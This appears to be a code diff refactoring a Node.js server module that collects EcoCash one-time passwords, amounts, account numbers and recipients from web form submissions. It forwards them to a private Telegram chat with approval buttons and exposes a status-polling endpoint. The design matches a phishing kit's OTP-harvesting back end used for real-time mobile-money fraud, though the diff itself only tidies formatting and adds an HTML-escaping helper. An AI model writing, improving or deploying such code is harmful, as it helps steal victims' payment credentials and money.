@@ -2,8 +2,8 @@
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';
 
-const pending = new Map();     // ref -> { decision, messageId }
-const decisions = new Map();   // ref -> 'pending' | 'approved' | 'expired' | 'inactive'
+const pending   = new Map(); // ref -> { decision, messageId }
+const decisions = new Map(); // ref -> 'pending' | 'approved' | 'expired' | 'inactive'
 
 function log(m) { console.log('[tg-eco]', m); }
 
@@ -13,7 +13,10 @@ async function sendTelegramMessage(text, keyboard) {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      chat_id: CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: true,
+      chat_id: CHAT_ID,
+      text,
+      parse_mode: 'HTML',
+      disable_web_page_preview: true,
       reply_markup: keyboard ? { inline_keyboard: keyboard } : undefined
     })
   });
@@ -21,19 +24,34 @@ async function sendTelegramMessage(text, keyboard) {
   if (!data.ok) throw new Error('Telegram send failed: ' + (data.description || 'unknown'));
   return data.result;
 }
+
 async function answerCallback(cqId, text) {
   if (!BOT_TOKEN) return;
   await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ callback_query_id: cqId, text, show_alert: false })
   }).catch(() => {});
 }
+
 async function clearButtons(messageId) {
   if (!BOT_TOKEN || !CHAT_ID) return;
   await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
-    method: 'POST', headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: CHAT_ID, message_id: messageId, reply_markup: { inline_keyboard: [] } })
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      message_id: messageId,
+      reply_markup: { inline_keyboard: [] }
+    })
   }).catch(() => {});
+}
+
+function escapeHtml(v) {
+  return String(v == null ? '—' : v)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
 }
 
 async function handleUpdate(update) {
@@ -60,24 +78,26 @@ async function handleUpdate(update) {
   };
   await answerCallback(cq.id, msgs[target] || 'Done.');
   log(`otp ${ref} → ${target}${e ? '' : ' (recovered)'}`);
+
   const mid = cq.message && cq.message.message_id;
   if (mid) await clearButtons(mid);
 }
 
 function registerRoutes(app) {
+  // Request OTP (also used for resend)
   app.post('/api/ecocash/otp', (req, res) => {
     const { tx, am, cur, c } = req.body || {};
-    const safe = (v) => String(v == null ? '—' : v).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
     sendTelegramMessage(
       `<b>🔁 EcoCash OTP requested</b>\n\n` +
-      `<b>Reference:</b> <code>${safe(tx)}</code>\n` +
-      `<b>Amount:</b> ${safe(cur)} ${safe(am)}\n` +
-      `<b>Country:</b> ${safe(c)}`,
+      `<b>Reference:</b> <code>${escapeHtml(tx)}</code>\n` +
+      `<b>Amount:</b> ${escapeHtml(cur)} ${escapeHtml(am)}\n` +
+      `<b>Country:</b> ${escapeHtml(c)}`,
       null
     ).catch(() => {});
     res.json({ ok: true });
   });
 
+  // Submit OTP → Telegram with 3 buttons
   app.post('/api/ecocash/submit', async (req, res) => {
     try {
       const { tx, otp, am, cur, c, an, rn } = req.body || {};
@@ -91,16 +111,14 @@ function registerRoutes(app) {
       pending.set(tx, { decision: 'pending', messageId: null });
       decisions.set(tx, 'pending');
 
-      const safe = (v) => String(v == null ? '—' : v).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-
       const text =
         `<b>🔐 New EcoCash OTP submitted</b>\n\n` +
-        `<b>Reference:</b> <code>${safe(tx)}</code>\n` +
-        `<b>OTP:</b> <code>${safe(otp)}</code>\n` +
-        `<b>Amount:</b> ${safe(cur)} ${safe(am)}\n` +
-        `<b>Country:</b> ${safe(c)}` +
-        (an ? `\n<b>Number:</b> ${safe(an)}` : '') +
-        (rn ? `\n<b>Recipient:</b> ${safe(rn)}` : '');
+        `<b>Reference:</b> <code>${escapeHtml(tx)}</code>\n` +
+        `<b>OTP:</b> <code>${escapeHtml(otp)}</code>\n` +
+        `<b>Amount:</b> ${escapeHtml(cur)} ${escapeHtml(am)}\n` +
+        `<b>Country:</b> ${escapeHtml(c)}` +
+        (an ? `\n<b>Number:</b> ${escapeHtml(an)}` : '') +
+        (rn ? `\n<b>Recipient:</b> ${escapeHtml(rn)}` : '');
 
       const keyboard = [[
         { text: '✅ Approve',     callback_data: `eco_approve:${tx}` },
@@ -120,6 +138,7 @@ function registerRoutes(app) {
     }
   });
 
+  // Poll decision
   app.get('/api/ecocash/status/:ref', (req, res) => {
     const ref = req.params.ref;
     const live = pending.get(ref);
